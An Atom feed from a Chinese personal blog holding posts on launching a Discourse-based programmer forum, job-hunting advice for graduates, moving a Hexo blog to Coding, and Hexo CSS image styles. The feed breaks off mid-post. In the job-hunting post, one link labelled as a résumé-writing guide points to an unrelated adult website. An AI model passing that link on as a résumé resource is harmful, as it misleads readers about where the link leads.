<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[Jark's Blog]]></title>
  <subtitle><![CDATA[当你的才华还撑不起你的野心时，你就应该静下心来学习。]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://wuchong.me/"/>
  <updated>2014-12-22T16:39:55.263Z</updated>
  <id>http://wuchong.me/</id>
  
  <author>
    <name><![CDATA[WuChong]]></name>
    <email><![CDATA[imjark@gmail.com]]></email>
  </author>
  
  <generator uri="http://zespia.tw/hexo/">Hexo</generator>
  
  <entry>
    <title><![CDATA[为什么要做「码农圈」？]]></title>
    <link href="http://wuchong.me/blog/2014/12/21/why-do-coderq/"/>
    <id>http://wuchong.me/blog/2014/12/21/why-do-coderq/</id>
    <published>2014-12-21T10:56:59.000Z</published>
    <updated>2014-12-22T16:18:37.000Z</updated>
    <content type="html"><![CDATA[<p><a href="https://coderq.com" target="_blank" rel="external"><img src="https://dn-coderq.qbox.me/uploads/default/17/7dac137579f3f0b5.png" class="img-logo"></a></p>
<p>做一个面向程序员交流分享学习的社区吧！</p>
<p>这个想法从一个月前的某个晚上就跳进了我的脑袋，之后好几个晚上因此兴奋地睡不着觉，呵呵。</p>
<blockquote>
<p>现在已经有类似的网站啦，像 segmentfault , V2EX , OurCoders , 甚至知乎里的某些板块。</p>
</blockquote>
<p>为什么还要有<a href="https://coderq.com" target="_blank" rel="external">「码农圈」</a>呢？</p>
<p>诚然，目前国内已经有很多耳熟能详的类似网站了，但是相信每一个细分的市场都有很大的空间。而我想做的自然有其独到的特点。首先，这是一个以交流分享为主的网站，不同于 segmentfault 专注于技术交流。在这里气氛可以更加活跃。</p>
<p>程序员是一个很独特的群体，他们可以因为一些 which better 的问题而争论不休，他们都有非常类似的特征，勤劳而聪慧，更重要的是，他们正在改变世界！正是这个群体，他们不仅需要讨论技术，他们同样也要找女朋友、结婚买房、会有生活上的烦恼困惑，会想换工作、想移民、想创业等等。正是基于这一点，「码农圈」的想法逐渐开始在我的脑海里成形，而它并不完全同于现有网站。</p>
<p>「码农圈」是一个以交流分享为主的网站，不同于 segmentfault 专注于技术问答类。「码农圈」是一个专注于程序员群体的社区，不同于 V2EX 的创意工作者们和知乎的广大群体们，在这里的信息会更加垂直更加社区化。「码农圈」是一个论坛形式的社区，这也不同于上面的问答形社区。最主要的是「码农圈」足够酷、足够方便、能适配各种端，这也是不同于北邮人这些传统论坛的方面。</p>
<p>程序员可以在这里交流一切，包括技术、人生、梦想乃至情感。不同于专业技术社区的压抑，在这里气氛会更加活跃，在这里你会与广大程序员有更多的共鸣。</p>
<a id="more"></a>

<h2 id="为什么叫码农圈呢？">为什么叫码农圈呢？</h2>
<p>码农在英文中的词可以对应为 coder，而程序员是 programmer。有趣的是，不管是国内国外人们对这两个词的看法是类似的。人们更愿意称自己是程序员，而不是码农。码农更早来源于IT民工，认为码农是一群收入低、没有技术、充当着代码搬运工的群体。但在我眼中的码农是任何 IT 技术人员必经的过程，他们心怀梦想，默默地在坑里打怪升级，一步步地成长为程序员、开发者、工程师、架构师、极客甚至是多隆一样的神。他们视技术为生命，不管职位多高都会自己动手写代码，坚持自由开放和平等。在这互联网颠覆世界的社会里，码农是一切IT技术创新的源泉，「码农圈」就是要聚集这样一群有改变自己、改变世界想法的 IT 人员，一起成长，一起搭建一个优质的技术人脉圈。</p>
<p>有了这个想法后，我就开始寻找可行的技术方案。起初决定使用 PHP 的 Laravel 框架自己写一个论坛。虽然 Laravel 的开发速度很快，但要做出一个可用网站原型仍需很久。于是我考虑基于现有开源软件做二次开发。我注意到了 <a href="https://github.com/summerblue/phphub" target="_blank" rel="external">PHPHUB</a> ，一款国人做的基于 Laravel 4.2 的开源论坛，网站简洁类似 V2EX 。也注意到了 <a href="http://www.wecenter.com/" target="_blank" rel="external">WeCenter</a> 这样的新型知识社区。但还是被 <a href="http://www.discourse.org/" target="_blank" rel="external">Discourse</a> 震撼到了。是的，我被这款声称要做论坛届的「WordPress」的开源产品了迷住了。其新颖的产品思维深深的打动了我，不愧是出自 Stackoverflow 和 StackExchange 的联合创始人 Jeff Atwood 之手。</p>
<p>于是开始了建站之旅，购买域名、主机、邮箱服务，搭建原型，上 SSL 、CDN。个人在其上又进行了大量修改，包括 UI 、功能添加、汉化等等。下面看看「码农圈」的特色功能吧。</p>
<p><br></p>
<h3 id="强大的编辑器，交流更顺畅">强大的编辑器，交流更顺畅</h3>
<p>回帖是一个论坛最为核心的功能，让用户在回帖过程中体验到方便和快感是很吸引人的。</p>
<p>您可以直接粘贴/拖拽一张图片到编辑框中，就可以实现上传。</p>
<p>在您阅读的时候，就开始写您的回复。在浏览主题的过程中修改您的回复并引用更多内容！您甚至可以在不同主题之间切换而无需打断编辑。</p>
<p>我们会保存您阅读的进度——以及您的帖子的草稿——即使您最后用不同的设备发表了帖子也行。</p>
<p>方便的Emoji 表情，能更丰富地表达你的想法。</p>
<p><img src="https://dn-coderq.qbox.me/uploads/default/42/3c67bee069ba7b5b.gif" class="img-shadow"></p>
<p><br></p>
<h3 id="简洁，附带上下文">简洁，附带上下文</h3>
<p>「码农圈」是一个简洁、扁平化的论坛，回复就像瀑布一样线性显示在页面中。回复可以展开，它们位于帖子的底部或顶部，以便您了解对话的完整上下文——而不用打断您的阅读。</p>
<p>Discourse 是一个简洁、平面化的论坛，回复就像瀑布一样线性显示在页面中。回复可以展开，它们位于帖子的底部或顶部，以便您了解对话的完整上下文——而不用打断您的阅读。</p>
<p><img src="https://dn-coderq.qbox.me/uploads/default/44/e2662b931cb749f9.gif" class="img-shadow"></p>
<p><br></p>
<h3 id="交流，无需翻页">交流，无需翻页</h3>
<p>为什么要把对话分割成尴尬麻烦、难以寻找的页面？何必不断地寻找下一页按钮？在这里你只要一直往下滚动屏幕即可。</p>
<p><img src="https://dn-coderq.qbox.me/uploads/default/47/36d75bd043a06c7e.gif" class="img-shadow"></p>
<p>Discourse 采用的技术也很时髦，Rails, Redis, PostgreSQL, Docker, Ember.js，都是很前沿的技术。通过学习源码，参与贡献，相信能学到很多实用的前沿技术。目前「码农圈」搭建在 <a href="https://www.digitalocean.com/?refcode=54668030e22a" target="_blank" rel="external">DigitalOcean</a> 上，使用 <a href="https://www.namecheap.com/" target="_blank" rel="external">NameCheap</a> 颁发的 SSL 证书为网站加上了 HTTPS（更安全），使用<a href="https://portal.qiniu.com/signup?code=3l91ovmeed8ia" target="_blank" rel="external">七牛云存储</a>为网站加上了 CDN（更快速）。另外还做了一些本地化的工作，使之更符合国人的习惯。加了一些插件，如微博微信分享等。改了一些主题样式，使之更符合我的口味。希望你们能喜欢上它！</p>
<p><br></p>
<h3 id="自动拓展链接信息">自动拓展链接信息</h3>
<p>想要分享东西？直接粘贴链接，我们会显示关于链接的详细信息。</p>
<p>链接至维基百科、GitHub、Twitter、Youtube和其他流行的网站就会自动显示扩展信息面板。</p>
<p><img src="https://dn-coderq.qbox.me/uploads/default/43/e7df0ecec539ec54.gif" class="img-shadow"></p>
<p>还有很多有意思的特性，感兴趣的可以去 <a href="https://coderq.com/t/ma-nong-quan-de-te-se-gong-neng/38" target="_blank" rel="external">码农圈的特色功能</a> 看看。</p>
<p>是程序员就加入<a href="https://coderq.com" target="_blank" rel="external">「码农圈」</a>吧！</p>
]]></content>
    <summary type="html"><![CDATA[<p><a href="https://coderq.com" target="_blank" rel="external"><img src="https://dn-coderq.qbox.me/uploads/default/17/7dac137579f3f0b5.png" class="img-logo"></a></p>
<p>做一个面向程序员交流分享学习的社区吧！</p>
<p>这个想法从一个月前的某个晚上就跳进了我的脑袋，之后好几个晚上因此兴奋地睡不着觉，呵呵。</p>
<blockquote>
<p>现在已经有类似的网站啦，像 segmentfault , V2EX , OurCoders , 甚至知乎里的某些板块。</p>
</blockquote>
<p>为什么还要有<a href="https://coderq.com" target="_blank" rel="external">「码农圈」</a>呢？</p>
<p>诚然，目前国内已经有很多耳熟能详的类似网站了，但是相信每一个细分的市场都有很大的空间。而我想做的自然有其独到的特点。首先，这是一个以交流分享为主的网站，不同于 segmentfault 专注于技术交流。在这里气氛可以更加活跃。</p>
<p>程序员是一个很独特的群体，他们可以因为一些 which better 的问题而争论不休，他们都有非常类似的特征，勤劳而聪慧，更重要的是，他们正在改变世界！正是这个群体，他们不仅需要讨论技术，他们同样也要找女朋友、结婚买房、会有生活上的烦恼困惑，会想换工作、想移民、想创业等等。正是基于这一点，「码农圈」的想法逐渐开始在我的脑海里成形，而它并不完全同于现有网站。</p>
<p>「码农圈」是一个以交流分享为主的网站，不同于 segmentfault 专注于技术问答类。「码农圈」是一个专注于程序员群体的社区，不同于 V2EX 的创意工作者们和知乎的广大群体们，在这里的信息会更加垂直更加社区化。「码农圈」是一个论坛形式的社区，这也不同于上面的问答形社区。最主要的是「码农圈」足够酷、足够方便、能适配各种端，这也是不同于北邮人这些传统论坛的方面。</p>
<p>程序员可以在这里交流一切，包括技术、人生、梦想乃至情感。不同于专业技术社区的压抑，在这里气氛会更加活跃，在这里你会与广大程序员有更多的共鸣。</p>
]]></summary>
    
      <category term="码农圈" scheme="http://wuchong.me/tags/%E7%A0%81%E5%86%9C%E5%9C%88/"/>
    
      <category term="Discourse" scheme="http://wuchong.me/tags/Discourse/"/>
    
      <category term="随笔生活" scheme="http://wuchong.me/categories/%E9%9A%8F%E7%AC%94%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[应届生如何找互联网工作]]></title>
    <link href="http://wuchong.me/blog/2014/12/21/how-to-find-internet-job/"/>
    <id>http://wuchong.me/blog/2014/12/21/how-to-find-internet-job/</id>
    <published>2014-12-21T07:06:16.000Z</published>
    <updated>2014-12-22T16:18:37.000Z</updated>
    <content type="html"><![CDATA[<p><img src="http://ww4.sinaimg.cn/mw690/81b78497jw1enhbntged4j20l30hkgnb.jpg" class="img-topic"></p>
<p>“就你，才面了几家公司还给别人指路啊？”，尽管会有人有这样那样的质疑，但我还是非常想说说这个话题，希望后来者不要再踩我的坑，希望能有更明确的努力方向，找到期望的工作。</p>
<p>距离<a href="http://wuchong.me/blog/2014/09/30/looking-for-a-job-summary/" target="_blank" rel="external">找工作小记</a>后，已经过去两个多月了，2014 校招季也靠一段落。由于我找的都是互联网方向的公司，所以本篇也主要针对如何找互联网技术类岗位。</p>
<p><a id="more"></a></p>
<h2 id="清晰的目标">清晰的目标</h2>
<p>大多数人觉得找工作应该是撒大网捕鱼，不应该在一棵树上吊死，老师们也这样好心地建议我们。但是我不这样认为，我认为人的精力是有限的，把有限的精力分散到多个方向，最后只会迷失自己。就像有些本科毕业生，又是找工作又是考研又是国考的，最后都没啥好结果。</p>
<p>所以，从一开始我就明确自己只找互联网技术类岗位，没有考虑过银行国企公务员等方向（当然如果有人找到了心仪的工作，再去其他方向碰碰机会也无可厚非）。我认为这是很重要的，作为一名应届生，应该有了自己的职业规划知道了自己喜欢的方向，不应该是迷茫或随从的状态。</p>
<p>其次，这个方向应该是越细致越好。大家都知道 IT 行业要细分，一双手都数不过来。如果你能清晰自己想从事的方向（安全？前端？数据挖掘？），并为此付出一定的准备，你会发现你其实没花多大力气就脱颖而出了。</p>
<p>如我，在一年多前就明确自己想进阿里中间件团队。</p>
<p>不知道自己喜欢什么方向？那就挑自己擅长或熟悉的。没有擅长或熟悉的？那就了解技术发展趋势，选一个趋势向上的。</p>
<h2 id="厚积薄发">厚积薄发</h2>
<p>有了明确的目标后，就可以去招聘网站看对应岗位的需求了，对着自己把一项项缺少的技能点记下来，并未自己制定一个详细的练级计划。在制定计划和练级期间，可能会对前进方向有些迷茫，这时可以请教行业领域的大牛。如我，加了老多阿里中间件牛人的微博，一个个问自己的疑惑，一般大牛都很乐于帮忙的。</p>
<p>一般IT公司的校招在每年的8月到12月，某些公司会在3月后有一次实习生招聘。所以，如果你是年初才开始准备，如果还要参加实习，那么留给你的时间真的不多。</p>
<h3 id="实习与项目经历">实习与项目经历</h3>
<p>国内公司面试喜欢先按着简历上的聊，一般都会聊到实习经历（如果有）和项目经历，如果有论文也会聊论文。比如，我经常会被问到“谈谈你最有成就感的一个项目？”，所以最好有一个能拿得出手，背得滚瓜烂熟的项目。所谓能拿的出手，是指最好能演示，有些技术问题、技术难点的项目。关键是能把项目流程、关键点、难点、解决方案等等流利地说出来。</p>
<p>项目不在多，一两个即可。我在准备面试的时候，才发现我的项目经历非常尴尬，做过的项目不少，却没有能拿的出手的。能勉强拿出手的居然是一个 .Net 项目，结果一路被各大面试官鄙视过来…</p>
<p>如果你发现和我一样，没关系，你还有半年时间准备。你可以挑一个还可以的项目进行一些技术改造；也可以参加个实习，用实习项目来镇住面试官；也可以参与开源项目，或者自己写点有意思的项目（并开源）。个人比较推荐后者，因为这个过程中，你能学到更多诸如版本控制、多人协作的知识，最主要是高逼格。</p>
<p>至于实习，在我看来是一把双刃剑。如果实习公司是自己的意向公司，那还是不错的。最好能去知名企业实习，表现好的都可以获得正式 Offer。就算没拿到，也可以为简历加分。但是，很可能因为实习的原因失去了复习巩固基础的时间，导致在面试中吃亏，失去更好的工作机会。所以，大家一定要考虑清楚。特别是已经有拿的出手的项目经历，实习不是那么必须了，还不如拿这些时间多阅读研究一些技术书籍。</p>
<p><img src="http://ww1.sinaimg.cn/mw690/81b78497jw1enhbo5h8d7j21kw16okg6.jpg" alt=""></p>
<h3 id="算法与数据结构">算法与数据结构</h3>
<p>算法和白板编程基本是互联网公司面试的家常菜。不管是应聘什么方向岗位，这一块都应该加强训练。国外公司比较看重算法编程，面试基本以算法题为主。国内公司的算法题难度相对不大，基本刷完主流题目就够了。</p>
<p>书籍方面按优先级推荐分别是<a href="http://book.douban.com/subject/6966465/" target="_blank" rel="external">《剑指Offer》</a>、<a href="http://book.douban.com/subject/25753386/" target="_blank" rel="external">《程序员面试金典》</a>、<a href="http://book.douban.com/subject/3004255/" target="_blank" rel="external">《编程之美》</a>。剑指中代码是C++写的，程序员面试金典是 Java 的。所以不同语言方向的可以选一本。推荐精读一本，泛读另两本就可以了。电子书的话非常推荐 July 写的<a href="https://github.com/julycoding/The-Art-Of-Programming-By-July/blob/master/ebook/zh/Readme.md" target="_blank" rel="external">程序员编程艺术</a>，可以迅速带你入门。July 的书籍应该马上上市了，可以关注下。</p>
<p>单靠看书的效果是比较差的，推荐书籍看的差不多的时候，可以配合 <a href="https://oj.leetcode.com/problems/" target="_blank" rel="external">LeetCode</a> 一起修炼，功力将会大增。LeetCode 目前题目已经出到第 168 题了，刷完的话应付国内公司真是绰绰有余了。在做题过程中尽量不要看题解和别人的答案，而在做完之后推荐多了解别人的做法会拓宽你的思路。另外官方出了本 <a href="https://oj.leetcode.com/book/" target="_blank" rel="external">LeetCode Book</a>，但是好贵…</p>
<h3 id="开放型题目">开放型题目</h3>
<p>面试官一般会针对你的岗位方向问一些开放型的题目，没有固定的答案，更多的是考察技术面广度深度。比如大数据处理技术、机器学习算法、网络传输、内存管理、开放型设计题、数据库的索引等等。这些只能通过平时多看多了解了，遇到问题喜欢刨根问底。</p>
<p>作为一名应届程序员，除了掌握一门静态语言外，还应该掌握一门动态语言，熟悉 Linux 的操作，深入的话可以了解 Unix 编程。Java 方向的应该深入学习 JVM 知识，C++ 方向的至少得看看<a href="http://book.douban.com/subject/5387403/" target="_blank" rel="external">《Effective C++》</a>吧。</p>
<h2 id="简历">简历</h2>
<p>简历是你迈向工作的第一步，但大多程序员不知道如何表达自己，而埋没了自己的才华。对于应届生来说，非常头疼的是简历该怎么写，写什么，用什么工具，写成什么格式。</p>
<p>作为一封技术简历，只需要包含三方面：第一是个人信息和联系方式，第二是实习和项目经历，第三是技术能力证明。不要有太多与求职岗位无关的经验过分描述，比如性别、主修课程、自我评价等。看看这些文章，你会了解如何更优雅地写简历：</p>
<ul>
<li><a href="https://coderq.com/t/a-li-ba-ba-xiao-zhao-nei-tui-jian-li-shai-xuan-fang-an/143/1" target="_blank" rel="external">阿里巴巴校招内推简历筛选方案</a></li>
<li><a href="http://www.burningangel.com/en" target="_blank" rel="external">精益技术简历之道——改善技术简历的47条原则</a></li>
<li><a href="http://www.zheyibu.com/article/1353.html?xa?nikki" target="_blank" rel="external">身为HR的我是这样挑实习生的</a></li>
</ul>
<p>至于工具和格式，作为程序员都应该用 MarkDown写，用PDF发。发求职邮件时的注意事项可以看看 @Fenng 大大写的 <a href="http://dbanotes.net/review/resume_email.html" target="_blank" rel="external">写一封「用户体验」良好的求职邮件</a> 。如果你有一个在线简历，那就更（BI）好（GE）了，你可以直接在邮件里附上你的在线简历地址，相对于下载附件 HR 会更欣喜于打开在线简历。可以参考本人的<a href="http://wuchong.me/resume.html" target="_blank" rel="external">在线简历</a>，工具已开源在 <a href="https://github.com/wuchong/resume.git" target="_blank" rel="external">GitHub</a> 上。也推荐这些比较优秀的在线简历生成工具。比如：</p>
<ul>
<li><a href="http://get.jobdeer.com/745.get" target="_blank" rel="external">DeerResume：在线MarkDown简历工具</a></li>
<li><a href="https://github.com/c0bra/markdown-resume-js" target="_blank" rel="external">基于Node.js的MarkDown简历生成工具</a></li>
</ul>
<h2 id="笔试">笔试</h2>
<p>笔试就是个坑，能逃就逃。</p>
<p><img src="http://ww2.sinaimg.cn/mw690/81b78497jw1enhbnrqon3j21kw122qdc.jpg" alt=""></p>
<p>笔试的考察面会更全一些，除了基础知识还会涉及语言细节、概率论、智力题等。</p>
<h2 id="内推">内推</h2>
<p>内推一般都能跳过笔试阶段，还能提前拿到校招 Offer，就算失败也不会影响正式校招，多了一次面试经验，何乐而不为。可以直接找师兄，也可以多留意一下 BBS 上的内推信息。</p>
<h2 id="面试">面试</h2>
<p>面试过程只要充分展示自己准备的东西就可以了。面试是一个双方的过程，一定要掌握面试的主动性，要多说话，不要让气氛冷下来，慢慢推动面试朝着自己擅长的方向引导。要知道，一场面试是有时间限制的，这场面试在你熟悉的领地打的越久，胜利的机会也就越高。</p>
<h2 id="写在最后">写在最后</h2>
<p>国内大学里的课程很多都照本宣科，很少能在面试和以后的工作中帮到我们。这是坏事，也是好事。坏处不用说，好处是只要比别人稍稍努力些就可以脱颖而出。</p>
<ul>
<li>可以上 <a href="https://www.coursera.org/" target="_blank" rel="external">Coursera</a>  看一些国外知名大学的公开课，拿到证书的话也是一个不错的加分项呐。</li>
<li>在学习理论知识的同时能够尽量尝试实践一下，比如学习了Unix网络通信，有没有自己动手写一个聊天工具。</li>
<li>好记性不如烂笔头。学习过程中勤做笔记，复习时效率会更高。推荐 <a href="https://www.yinxiang.com/" target="_blank" rel="external">印象笔记</a>。</li>
<li>建立个人博客。把笔记整理一下就能发表一篇不错的博文，不仅帮助自己梳理知识，还能帮助别人。建立个人博客不是为了面试，而是更重要的：树立个人品牌。后者是会伴随你一辈子的。<a href="http://mindhacks.cn/2009/02/15/why-you-should-start-blogging-now/" target="_blank" rel="external">为什么你应该（从现在开始就）写博客</a> 以及<a href="https://selfstore.io/products/190" target="_blank" rel="external">《程序员跳槽攻略》</a>中的个人品牌章节。</li>
</ul>
<p>最后，希望本文对即将找工作的朋友能有帮助。欢迎提问，欢迎大牛指正。</p>
]]></content>
    <summary type="html"><![CDATA[<p><img src="http://ww4.sinaimg.cn/mw690/81b78497jw1enhbntged4j20l30hkgnb.jpg" class="img-topic"></p>
<p>“就你，才面了几家公司还给别人指路啊？”，尽管会有人有这样那样的质疑，但我还是非常想说说这个话题，希望后来者不要再踩我的坑，希望能有更明确的努力方向，找到期望的工作。</p>
<p>距离<a href="http://wuchong.me/blog/2014/09/30/looking-for-a-job-summary/" target="_blank" rel="external">找工作小记</a>后，已经过去两个多月了，2014 校招季也靠一段落。由于我找的都是互联网方向的公司，所以本篇也主要针对如何找互联网技术类岗位。</p>
<p>]]></summary>
    
      <category term="面试" scheme="http://wuchong.me/tags/%E9%9D%A2%E8%AF%95/"/>
    
      <category term="职场生涯" scheme="http://wuchong.me/categories/%E8%81%8C%E5%9C%BA%E7%94%9F%E6%B6%AF/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[托管 Hexo 博客到 Coding]]></title>
    <link href="http://wuchong.me/blog/2014/12/18/hexo-blog-to-coding/"/>
    <id>http://wuchong.me/blog/2014/12/18/hexo-blog-to-coding/</id>
    <published>2014-12-18T13:47:13.000Z</published>
    <updated>2014-12-22T16:18:37.000Z</updated>
    <content type="html"><![CDATA[<p><img src="http://ww2.sinaimg.cn/large/81b78497jw1ene69i4dilj20b4036aa7.jpg" class="img-topic"></p>
<p>前两天收到了 GitCafe 的紧急邮件，大意就是说：由于「有关部门」查水表，我们的 GitCafe Pages 服务需要暂时关闭自定义域名功能。当时就有点想 F*uking XXX，当然不是指 GitCafe，大家都懂。</p>
<p>根据 GitCafe 的提示，只需要修改 DNS 配置中的 A 记录为 CNAME 到 xxx.gitcafe.io 即可。但是，貌似 GitCafe 有些手忙脚乱 gitcafe.io 还没有上线，导致会跳到 gitcafe 的个人活动页面。这里其实直接用 A 记录指到  207.226.141.135 就可以。不过你会发现，你的域名变成了 xxx.gitcafe.com 。作为强迫症患者，这怎么能忍？</p>
<p>难道又要迁回水土不服，国内老挂的 GitHub 上吗？这时候 Coding 出现了。（你说Coding君是不是应该给点广告费？）</p>
<a id="more"></a>

<h2 id="迁移到_Coding">迁移到 Coding</h2>
<p>“Coding 是一个面向开发者的云端开发平台，目前提供代码托管，运行空间，质量控制，项目管理等功能。”好吧，我们只想用托管功能和最近新出的<a href="https://coding.net/u/panpan/p/Coding-PaaS/topic/10263" target="_blank" rel="external">自定义域名·免备案</a>。</p>
<h3 id="创建项目">创建项目</h3>
<p>创建一个博客项目，名称无所谓，然后在项目页面获取 SSH 或 HTTPS 地址。</p>
<p><img src="http://ww2.sinaimg.cn/large/81b78497jw1ene5wf0vh8j20yz0doq5w.jpg" alt=""></p>
<h3 id="推送代码">推送代码</h3>
<p>修改 Hexo 根目录下的配置文件<code>_config.yml</code>，修改最后的 deploy 参数。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
</pre></td><td class="code"><pre><span class="label">deploy:</span>
  type: github
  repo: https://coding<span class="preprocessor">.net</span>/jark/blog<span class="preprocessor">.git</span>  <span class="preprocessor">#改成你的项目地址</span>
  branch: master
</pre></td></tr></table></figure>

<p><em>如果你使用的是 SSH 地址，还需要设置<a href="https://coding.net/user/setting/keys" target="_blank" rel="external">SSH公钥</a>。</em></p>
<p>然后运行<code>hexo d</code>就会推送代码到 Coding 项目上。（最好先<code>hexo clean</code>并删除目录下的<code>.deploy</code>文件夹）</p>
<h3 id="部署项目">部署项目</h3>
<p>在「演示」标签页下，点击“开始检测”（不管提示，强制开启）。</p>
<p><img src="http://ww1.sinaimg.cn/large/81b78497jw1ene5wa2fkzj20w70he41z.jpg" alt=""> </p>
<p>在开启功能中，我们选择香港节点（因为只有香港节点提供免费自定义域名服务）。</p>
<p><img src="http://ww3.sinaimg.cn/large/81b78497jw1ene5wavsc4j20tk07r0tp.jpg" alt=""> </p>
<p>然后进入控制台，配置部署版本为<code>master</code>分支，运行环境为<code>HTML</code>，选择自定义域名并填写自己的域名。最后点击“一键部署”！ （内存好多，不过懒得改了）</p>
<p><img src="http://ww2.sinaimg.cn/large/81b78497jw1ene5wcxf84j20qk0hrjug.jpg" alt=""> </p>
<p>稍等片刻后就可以看到运行中的项目了。 </p>
<p><img src="http://ww3.sinaimg.cn/large/81b78497jw1ene5wbneo4j20qw0eigns.jpg" alt=""></p>
<p>资源浪费好多…太任性了…</p>
<h3 id="更改DNS">更改DNS</h3>
<p>最后一步，官方说法是将域名的 CNAME 记录值指向 api.codingapp.com。但如果你用的是根域名，可能会提示 CNAME 和 MX 记录冲突。这里可以使用 A 记录指向 119.9.72.107 ，效果是一样的。</p>
<p>在浏览器中输入你的域名，能看到访问正常，并且不会变成恶心的某二级域名。PING 一下，发现速度也还不错。</p>
<p><img src="http://ww1.sinaimg.cn/large/81b78497jw1ene62w9z3aj216g0vywo7.jpg" alt=""> </p>
<h2 id="写在最后">写在最后</h2>
<p>有些不足的地方是，每当博客需要更新时，不仅要<code>hexo d</code>推送代码上去，还需要去控制台“一键部署”。</p>
<p>香港节点提供自定义域名，但只免费开放到 2015 年前。不过官方有个福利，如果平均每两个月有一篇原创技术博客产出，就可以向 <a href="https://coding.net/u/coding" target="_blank" rel="external">@Coding</a> 提出申请免费使用自定义域名服务。</p>
<p>不过估计年底前，GitCafe 就该重新开放自定义域名了吧。真的非常感谢 GitCafe 一直以来的努力，非常好的产品。希望 GitCafe 能挺过这一关。</p>
<p><em>PS:有任何关于 Hexo 的问题，欢迎来 <a href="https://coderq.com/c/ji-zhu/hexo" target="_blank" rel="external">Hexo 中文社区</a> 咨询。</em></p>
]]></content>
    <summary type="html"><![CDATA[<p><img src="http://ww2.sinaimg.cn/large/81b78497jw1ene69i4dilj20b4036aa7.jpg" class="img-topic"></p>
<p>前两天收到了 GitCafe 的紧急邮件，大意就是说：由于「有关部门」查水表，我们的 GitCafe Pages 服务需要暂时关闭自定义域名功能。当时就有点想 F*uking XXX，当然不是指 GitCafe，大家都懂。</p>
<p>根据 GitCafe 的提示，只需要修改 DNS 配置中的 A 记录为 CNAME 到 xxx.gitcafe.io 即可。但是，貌似 GitCafe 有些手忙脚乱 gitcafe.io 还没有上线，导致会跳到 gitcafe 的个人活动页面。这里其实直接用 A 记录指到  207.226.141.135 就可以。不过你会发现，你的域名变成了 xxx.gitcafe.com 。作为强迫症患者，这怎么能忍？</p>
<p>难道又要迁回水土不服，国内老挂的 GitHub 上吗？这时候 Coding 出现了。（你说Coding君是不是应该给点广告费？）</p>
]]></summary>
    
      <category term="Hexo" scheme="http://wuchong.me/tags/Hexo/"/>
    
      <category term="Coding" scheme="http://wuchong.me/tags/Coding/"/>
    
      <category term="Hexo" scheme="http://wuchong.me/categories/Hexo/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[为 Hexo 主题添加多种图片样式]]></title>
    <link href="http://wuchong.me/blog/2014/12/13/hexo-theme-creating-image-styles/"/>
    <id>http://wuchong.me/blog/2014/12/13/hexo-theme-creating-image-styles/</id>
    <published>2014-12-13T12:11:56.000Z</published>
    <updated>2014-12-22T16:18:37.000Z</updated>
    <content type="html"><![CDATA[<p><img src="http://ww4.sinaimg.cn/large/81b78497jw1en8b95t5kmj203j00u743.jpg" class="img-logo"></p>
<p>为一篇博客添加相关的图片可以快速吸引读者的目光，也能帮助读者理解文章概要，尤其是在写技术博客或是某些很复杂的东西时。</p>
<p>然而，Hexo 主题一般只提供一种默认的图片样式，包括 Jacman。所以，我为 Jacman 实现了几种常见的图片样式。这里我会展示这几种图片样式以及其实现方法。</p>
<a id="more"></a>

<h2 id="主题图片">主题图片</h2>
<p>我比较喜欢像<a href="http://www.36kr.com/" target="_blank" rel="external">36氪</a>那样，一篇文章带一张相关图片。图片能传达的信息永远比文字丰富。当浏览文章列表时，除了标题最吸引人的自然就属文章主题图片了。</p>
<p>所以为了方便使用，我创建了一个图片样式叫<code>img-topic</code>，大概是长这样子的。</p>
<figure class="highlight css"><figcaption><span>/themes/jacman/source/css/_partial/index.styl</span></figcaption><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
</pre></td><td class="code"><pre><span class="class">.img-topic</span>
  <span class="tag">max-width</span>: 300<span class="tag">px</span>;
  <span class="tag">max-height</span>: 1800<span class="tag">px</span>;
  <span class="tag">display</span>: <span class="tag">block</span> ;
  <span class="tag">margin-left</span>: <span class="class">.7em</span>;
  <span class="tag">margin-right</span>: <span class="class">.7em</span>;
  <span class="tag">padding</span>: 0;
  <span class="tag">float</span>: <span class="tag">right</span>;
  <span class="tag">clear</span>: <span class="tag">right</span>;
</pre></td></tr></table></figure>

<p>在博客中，我更希望主题图片居右，并且点进文章正文后该图片不会显示。我们可以使用HTML语法插入图片。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre>&lt;img src=<span class="string">"图片路径"</span> <span class="keyword">class</span>=<span class="string">"img-topic"</span> /&gt;
</pre></td></tr></table></figure>

<p>这儿是一张使用<code>img-topic</code>样式后的效果图。</p>
<p><img src="http://ww2.sinaimg.cn/large/81b78497jw1en8cj4beb9j20s80b8adb.jpg" alt="img-topic效果图"></p>
<h2 id="Logo_图片">Logo 图片</h2>
<p>Logo 图片可以快速定义一篇文章的主题。与主题图片非常类似，只不过 Logo  图片放置的是 Logo ，而且一般比主题图片要小。类似的，Logo 图片也是居右，并且在文章正文中不会显示。</p>
<p>关于<code>img-logo</code>的样式如下</p>
<figure class="highlight css"><figcaption><span>/themes/jacman/source/css/_partial/index.styl</span></figcaption><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
</pre></td><td class="code"><pre><span class="class">.img-logo</span> 
  <span class="tag">max-width</span>: 180<span class="tag">px</span>;
  <span class="tag">max-height</span>: 96<span class="tag">px</span>;
  <span class="tag">display</span>: <span class="tag">block</span>;
  <span class="tag">margin-right</span>: <span class="class">.7em</span>;
  <span class="tag">margin-left</span>: <span class="class">.7em</span>;
  <span class="tag">padding</span>: 0;
  <span class="tag">float</span>: <span class="tag">right</span>;
  <span class="tag">clear</span>: <span class="tag">right</span>;
</pre></td></tr></table></figure>

<p>使用HTML语法插入图片</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre>&lt;img src=<span class="string">"图片路径"</span> <span class="keyword">class</span>=<span class="string">"img-logo"</span> /&gt;
</pre></td></tr></table></figure>

<p>效果如下图：</p>
<p><img src="http://ww4.sinaimg.cn/large/81b78497jw1en8cj55warj20se0avgoh.jpg" alt="img-logo效果图"></p>
<h2 id="居中图片">居中图片</h2>
